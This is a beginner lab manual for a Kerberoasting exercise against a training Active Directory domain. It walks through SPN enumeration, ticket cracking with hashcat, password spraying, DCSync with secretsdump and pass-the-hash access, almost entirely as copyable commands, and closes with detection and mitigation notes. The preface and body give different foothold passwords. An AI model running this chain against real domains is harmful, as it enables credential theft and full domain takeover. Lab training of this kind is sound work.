> **Self-hosted note (read first).** This manual was written for the hosted
> RootDC lab. In your own VM setup, three things differ:
>
> - **Attacker machine:** wherever the manual says Kali at `10.0.1.100` or
>   `ssh kali@10.0.1.100` (password `Start123!`), use **your own** Kali/Linux VM
>   on the same host-only network. Those hosted credentials do not apply here.
> - **Target DC IP:** wherever the manual uses a DC IP (e.g. `10.0.1.10`), use
>   **your** Windows Server VM's IP. Find it by running `ipconfig` on the DC.
> - **No flag / scoreboard:** there is nothing to submit. Success = you crack the
>   high-value account and authenticate as it.
>
> Your domain foothold account is **`attacker` / `Welcome1!`** (same as hosted).
> The exact target accounts for this lab are in `C:\RootDC\scenarios\` on the DC.


# Kerberoasting 101 - Lab Manual (Beginner)

## 1. Scenario Overview

**Kerberoasting** is an attack against Active Directory that exploits how Kerberos handles service account authentication. When a service account has a Service Principal Name (SPN) registered, any authenticated domain user can request a Kerberos ticket (TGS) for that service. This ticket is encrypted with the service account's password hash — meaning you can take it offline and crack it without any further interaction with the domain.

**Why it matters:** Service accounts often have weak passwords and excessive privileges. A single Kerberoastable account with Domain Admin rights means game over for the domain.

**MITRE ATT&CK:** T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting

---

## 2. Objectives Recap

1. Enumerate accounts with Service Principal Names (SPNs)
2. Request TGS tickets for discovered service accounts
3. Crack at least one service account password
4. Leverage password reuse to find a privileged account
5. DCSync to extract the Administrator hash and capture the flag

---

## 3. Starting Point

**Your attacker machine:** Kali Linux at `10.0.1.100` — all tools are pre-installed.

**Connect to your machine:**
```bash
ssh kali@10.0.1.100   # Password: Start123!
```

**Your domain credentials:**
- Username: `attacker`
- Password: `Start123!`
- Domain: `fallen.local`

**Network position:** You are a standard domain user with no special privileges. You attack the DC remotely from your Kali machine.

**Target:** Domain Controller DC01 at `10.0.1.10` (also saved in `/home/kali/lab/target`)

**Lab info:** Check `/home/kali/lab/README.txt` for scenario details and `/home/kali/lab/CHEATSHEET.txt` for a quick command reference.

---

## 4. Phase 1: Reconnaissance

### What to enumerate
- User accounts with SPNs set (these are Kerberoastable)
- Group memberships of those accounts (to find high-value targets)

### Success signals
- You find multiple accounts with SPNs
- At least one account is in a privileged group

### Commands

**List all Kerberoastable accounts:**
```bash
impacket-GetUserSPNs 'fallen.local/attacker:Start123!' -dc-ip 10.0.1.10
```

Expected output pattern:
```
ServicePrincipalName                 Name        MemberOf
-----------------------------------  ----------  --------
MSSQLSvc/sql01.fallen.local:1433    svc-sql     CN=Server Operators...
HTTP/web01.fallen.local              svc-web     CN=Domain Users...
```

**Alternative — enumerate with BloodHound:**
```bash
bloodhound-python -c All -u attacker -p 'Start123!' -d fallen.local -ns 10.0.1.10
```
Then import the JSON files into BloodHound to visualize Kerberoastable paths.

**Alternative — LDAP query:**
```bash
ldapsearch -H ldap://10.0.1.10 -D 'attacker@fallen.local' -w 'Start123!' \
  -b 'DC=fallen,DC=local' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName memberOf
```

---

## 5. Phase 2: Exploitation

### Tools available
- **impacket-GetUserSPNs** — Request TGS tickets from Kali
- **hashcat** — Crack the ticket hashes (GPU-accelerated)
- **john** — Alternative cracking tool

### Request TGS tickets

```bash
# Request tickets and save to file
impacket-GetUserSPNs 'fallen.local/attacker:Start123!' -dc-ip 10.0.1.10 -request -outputfile hashes.txt
```

### Crack the hashes

The TGS tickets are encrypted with the service account's NTLM hash. Use hashcat mode 13100 for Kerberos 5 TGS-REP etype 23:

```bash
# Crack with rockyou wordlist
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Show cracked passwords
hashcat -m 13100 hashes.txt --show
```

Alternative with John:
```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Expected indicators
- Hashcat shows "Cracked" status
- You recover one or more plaintext passwords
- Focus on cracking the account that has privileged group membership

---

## 6. Phase 3: Privilege Escalation

### Path logic
1. You cracked passwords for one or more service accounts (e.g. `svc-sql` → `Passw0rd`)
2. These service accounts are **not** Domain Admins — but their passwords may be reused elsewhere
3. Try the cracked password against other domain accounts (password reuse / password spraying)
4. Discover that `backup-operator` uses the same password
5. `backup-operator` has **DCSync rights** — it can replicate password hashes from the DC

### Step 1: Enumerate all domain users

Go back to your **original `attacker` credentials** (not the cracked service accounts) and list every user in the domain:

```bash
# List all domain users using your attacker account
nxc smb 10.0.1.10 -u 'attacker' -p 'Start123!' --users
```

You'll see accounts like `svc-sql`, `svc-web`, `backup-operator`, `m.ackerman`, `t.wilson`, etc. A pre-built list is also available at `/home/kali/lab/users.txt`.

### Step 2: Spray the cracked password

Now spray the password you cracked (`Passw0rd`) against ALL those users to find password reuse:

```bash
# Spray Passw0rd against all domain users
nxc smb 10.0.1.10 -u /home/kali/lab/users.txt -p 'Passw0rd' --continue-on-success
```

You'll see multiple accounts showing `[+]` — they all share the password `Passw0rd`.

### Find which account has DCSync rights

Not all accounts are equal. One of them has **replication permissions** (DCSync rights) on the domain. Try `impacket-secretsdump` with each compromised account — the one with DCSync will return hashes, the others will fail:

```bash
# Try each [+] account — only one will work
impacket-secretsdump 'fallen.local/svc-sql:Passw0rd@10.0.1.10' -just-dc-user Administrator
# ^ This will FAIL with ERROR_DS_DRA_BAD_DN (no DCSync rights)

impacket-secretsdump 'fallen.local/backup-operator:Passw0rd@10.0.1.10' -just-dc-user Administrator
# ^ This will SUCCEED — backup-operator has DCSync rights!
```

The successful output looks like:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<nt_hash>:::
```

The NT hash is the 4th field (after the 3rd colon) — that's what you use for pass-the-hash.

---

## 7. Flag / Proof of Compromise

### How to validate success
The flag is located on the Administrator's Desktop on DC01.

### Where to find it
Use the Administrator's NTLM hash (pass-the-hash) to access the flag:

```bash
# Pass-the-hash to read the flag
nxc smb 10.0.1.10 -u Administrator -H '<nt_hash>' -x 'type C:\Users\Administrator\Desktop\flag.txt'
```

**Alternative — get a shell:**
```bash
impacket-psexec 'fallen.local/Administrator@10.0.1.10' -hashes ':<nt_hash>'
type C:\Users\Administrator\Desktop\flag.txt
```

**Alternative — SMB access:**
```bash
smbclient '//10.0.1.10/C$' -U 'Administrator' --pw-nt-hash '<nt_hash>'
cd Users\Administrator\Desktop
get flag.txt
cat flag.txt
```

---

## 8. Troubleshooting

### SSH to Kali
- Connect: `ssh kali@10.0.1.100` (password: `Start123!`)
- Host key error? Run `ssh-keygen -R 10.0.1.100` then reconnect

### VPN Issues
- Ensure WireGuard shows "Connected" status
- Test connectivity: `ping 10.0.1.10`
- If ping fails, check your WireGuard config

### Kerberos Time Skew
Kerberos requires clocks to be synchronized within 5 minutes.
```bash
# Sync your clock with the DC
sudo ntpdate 10.0.1.10
```

### "KDC_ERR_PREAUTH_FAILED"
- Double-check your password: `Start123!`
- Verify the domain: `fallen.local`
- Ensure the username is correct: `attacker`

### Hashcat not cracking
- Ensure you're using mode 13100
- Try with `-O` for optimized kernels
- Use a larger wordlist if rockyou fails

### impacket-GetUserSPNs "No entries found"
- Verify you can authenticate first
- Check DC IP: `cat /home/kali/lab/target`
- Ensure DNS resolves or use IP directly

---

## 9. Defender Notes

### Mitigations
- **Use strong passwords** for service accounts (25+ characters)
- **Use Group Managed Service Accounts (gMSAs)** which rotate passwords automatically
- **Minimize service account privileges** — never add to Domain Admins
- **Use AES256 encryption** for Kerberos (harder to crack)

### Detection
- **Event ID 4769** — Kerberos Service Ticket Operations
  - Look for unusual encryption types (RC4 = 0x17)
  - High volume of TGS requests from single user
- **Event ID 4768** — Kerberos TGT requests
- **Honey accounts** — Create fake SPNs and alert on ticket requests

### Monitoring queries
```kql
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"  // RC4
| summarize count() by Account, ServiceName
```

---

## 10. Learn More

- [Kerberoasting - MITRE ATT&CK](https://attack.mitre.org/techniques/T1558/003/)
- [HackTricks - Kerberoast](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [Harmj0y - Kerberoasting Without Mimikatz](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
- [SpecterOps - Kerberoasting Revisited](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
- [Sean Metcalf - AD Security Kerberoasting](https://adsecurity.org/?p=2293)
